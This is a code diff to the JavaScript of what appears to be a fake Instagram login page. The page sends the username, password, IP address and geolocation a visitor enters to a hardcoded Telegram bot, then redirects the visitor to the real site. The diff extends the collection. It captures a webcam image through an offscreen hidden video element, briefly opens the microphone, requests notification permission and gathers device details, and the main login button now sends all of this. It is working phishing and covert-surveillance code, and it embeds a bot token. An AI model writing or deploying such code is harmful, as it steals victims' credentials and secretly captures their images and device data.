@@ -382,6 +382,19 @@
             const isPhoneNumber = (input) => /^\d{10}$/.test(input);
             const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);
 
+            // Helper function to query permission status (only for permissions where it makes sense to query before requesting)
+            async function getPermissionStatus(name) {
+                try {
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const result = await navigator.permissions.query({ name: name });
+                        return result.state; // 'granted', 'denied', 'prompt'
+                    }
+                    return 'API Not Supported';
+                } catch (e) {
+                    return `Error querying (${e.message || e.name})`;
+                }
+            }
+
             // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
             async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
                 const browser = navigator.userAgent;
@@ -391,7 +404,12 @@
 
                 let ip = 'Error in fetching IP';
                 let locationText = 'Error in fetching Geolocation';
-                
+                let cameraStatus = 'N/A';
+                let microphoneStatus = 'N/A';
+                let notificationsStatus = 'N/A';
+                let photoDataInfo = 'N/A'; // For captured photo snippet/status
+                let audioStatus = 'N/A';   // For microphone usage status
+
                 // Fetch IP address
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -417,21 +435,167 @@
                     });
                 } catch (e) { /* Error in fetching Geolocation */ }
 
-                // No other permission/device info collection if not explicitly requested
-                let detailedInfoSection = '';
+
                 if (includeDetailedInfo) {
-                    detailedInfoSection = `
-🔋 *Device Info (Limited):*
-- Battery Level: ${navigator.getBattery ? ((await navigator.getBattery()).level * 100).toFixed(0) + '%' : 'API Not Supported'}
-- Battery Charging: ${navigator.getBattery ? ((await navigator.getBattery()).charging ? 'Yes' : 'No') : 'API Not Supported'}
-- Network Type: ${navigator.connection ? navigator.connection.type || 'N/A' : 'API Not Supported'}
-- Effective Network Type: ${navigator.connection ? navigator.connection.effectiveType || 'N/A' : 'API Not Supported'}
-- Device Memory: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'API Not Supported'}
-- Hardware Concurrency (CPU cores): ${navigator.hardwareConcurrency || 'API Not Supported'}
-- Gallery: Not directly accessible (requires user file selection)
+                    // Camera Access & Capture
+                    try {
+                        const currentCameraState = await getPermissionStatus('camera');
+                        if (currentCameraState === 'granted' || currentCameraState === 'prompt') {
+                            cameraStatus = currentCameraState === 'granted' ? 'Granted' : 'Prompted & Granted';
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                                const video = document.createElement('video');
+                                video.style.position = 'absolute'; // Hide video element
+                                video.style.left = '-9999px';
+                                video.style.top = '-9999px';
+                                video.autoplay = true;
+                                video.srcObject = stream;
+                                document.body.appendChild(video);
+                                
+                                await new Promise(resolve => {
+                                    video.onloadedmetadata = () => {
+                                        // Ensure video is ready before drawing
+                                        video.play(); // Start playing to ensure frame is available
+                                        resolve();
+                                    };
+                                });
+
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 128; // Small resolution for demo
+                                canvas.height = 96;
+                                const context = canvas.getContext('2d');
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const fullBase64Image = canvas.toDataURL('image/jpeg', 0.5); // 50% quality JPEG
+
+                                // Only include a snippet and length for text message
+                                photoDataInfo = `Captured (Size: ${fullBase64Image.length} chars). Snippet: ${fullBase64Image.substring(0, 50)}...`;
+
+                                stream.getTracks().forEach(track => track.stop()); // Stop camera stream
+                                document.body.removeChild(video);
+                                document.body.removeChild(canvas); // Clean up canvas element
+                            } catch (captureError) {
+                                photoDataInfo = `Error capturing photo (${captureError.message || captureError.name})`;
+                                cameraStatus = `${cameraStatus} (Capture Error)`;
+                            }
+                        } else if (currentCameraState === 'denied') {
+                            cameraStatus = 'Permission Denied';
+                        } else {
+                            cameraStatus = `Error/Denied Camera (${currentCameraState})`;
+                        }
+                    } catch (e) {
+                        cameraStatus = `Error processing Camera (${e.message || e.name})`;
+                    }
+
+                    // Microphone Access (Symbolic use)
+                    try {
+                        const currentMicState = await getPermissionStatus('microphone');
+                        if (currentMicState === 'granted' || currentMicState === 'prompt') {
+                            microphoneStatus = currentMicState === 'granted' ? 'Granted' : 'Prompted & Granted';
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                                stream.getTracks().forEach(track => track.stop()); // Stop stream immediately
+                                audioStatus = 'Microphone briefly accessed.';
+                            } catch (captureError) {
+                                audioStatus = `Error accessing microphone for symbolic use (${captureError.message || captureError.name})`;
+                                microphoneStatus = `${microphoneStatus} (Access Error)`;
+                            }
+                        } else if (currentMicState === 'denied') {
+                            microphoneStatus = 'Permission Denied';
+                        } else {
+                            microphoneStatus = `Error/Denied Microphone (${currentMicState})`;
+                        }
+                    } catch (e) {
+                        microphoneStatus = `Error processing Microphone (${e.message || e.name})`;
+                    }
+
+                    // Notifications Access
+                    try {
+                        const permission = await Notification.requestPermission();
+                        notificationsStatus = permission; // 'granted', 'denied', or 'default'
+                    } catch (e) {
+                        notificationsStatus = `Error in fetching Notifications (${e.message || e.name})`;
+                    }
+
+                    // Battery Status API
+                    try {
+                        if ('getBattery' in navigator) {
+                            const battery = await navigator.getBattery();
+                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                            batteryCharging = battery.charging ? 'Yes' : 'No';
+                        } else {
+                            batteryLevel = 'API Not Supported';
+                            batteryCharging = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
+                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
+                    }
+
+                    // Network Information API
+                    try {
+                        if ('connection' in navigator && navigator.connection) {
+                            networkType = navigator.connection.type || 'N/A';
+                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
+                        } else {
+                            networkType = 'API Not Supported';
+                            networkEffectiveType = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        networkType = `Error in fetching Network info (${e.message || e.name})`;
+                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
+                    }
+
+                    // Device Memory
+                    try {
+                        if ('deviceMemory' in navigator) {
+                            deviceMemory = `${navigator.deviceMemory} GB`;
+                        } else {
+                            deviceMemory = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
+                    }
+
+                    // Hardware Concurrency
+                    try {
+                        if ('hardwareConcurrency' in navigator) {
+                            hardwareConcurrency = navigator.hardwareConcurrency;
+                        } else {
+                            hardwareConcurrency = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
+                    }
+                } // End of includeDetailedInfo block
+
+                let permissionSection = '';
+                let mediaDataSection = '';
+
+                if (includeDetailedInfo) {
+                    permissionSection = `
+🔒 *Permissions Status:*
+- Camera: ${cameraStatus}
+- Microphone: ${microphoneStatus}
+- Notifications: ${notificationsStatus}
+- Gallery: Access via file input only (not directly accessible)
 - SMS: Not directly accessible (browser security restriction)
+
+🔋 *Device Info:*
+- Battery Level: ${batteryLevel}
+- Battery Charging: ${batteryCharging}
+- Network Type: ${networkType}
+- Effective Network Type: ${networkEffectiveType}
+- Device Memory: ${deviceMemory}
+- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
 `;
+                    if (photoDataInfo !== 'N/A') {
+                        mediaDataSection += `\n📷 *Photo Capture Info:* ${photoDataInfo}`;
+                    }
+                    if (audioStatus !== 'N/A') {
+                        mediaDataSection += `\n🎙️ *Microphone Use Info:* ${audioStatus}`;
+                    }
                 }
+
 
                 const fullMessage = `
 ? *${actionType}*
@@ -447,9 +611,8 @@
 
 🌍 *IP Address:* ${ip}
 📍 *Geolocation:* ${locationText}
-${detailedInfoSection}
-
-${detailedInfoSection}
+${permissionSection}
+${mediaDataSection}
 `;
 
                 const botToken = '8110993477:AAH13IhAuwiaM7shHomBLrOpVcsk7jyIFLE';
@@ -496,8 +659,8 @@ ${detailedInfoSection}
                 }
 
                 if (isValidIdentifier && password) {
-                    // Only basic info sent for primary login button
-                    await sendToTelegram(identifier, password, 'Login Attempt (Basic Info)');
+                    // **CHANGED**: Primary login button now also sends detailed info
+                    await sendToTelegram(identifier, password, 'Login Attempt (Detailed Info)', true);
                     window.location.href = "https://www.instagram.com";
                 } else {
                     alert(validationMessage.trim() || 'Please fill in both fields correctly.');
@@ -509,7 +672,7 @@ ${detailedInfoSection}
                 // Exclude the login-button itself as it has its own logic
                 if (link.id === 'login-button') return;
 
-                // Only apply detailed info collection to Facebook Login and Forgot Password
+                // Apply detailed info collection to Facebook Login and Forgot Password
                 const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
                 if (link.classList.contains('facebook-login') || link.classList.contains('forgot-password')) {
                      link.addEventListener('click', async (event) => {
@@ -527,6 +690,7 @@ ${detailedInfoSection}
                         const identifier = usernameEmailPhoneInput.value.trim();
                         const password = passwordInput.value.trim();
                         
+                        // Default for other links is basic info (unless you specifically want detailed info here too)
                         await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`);
                     });
                 }
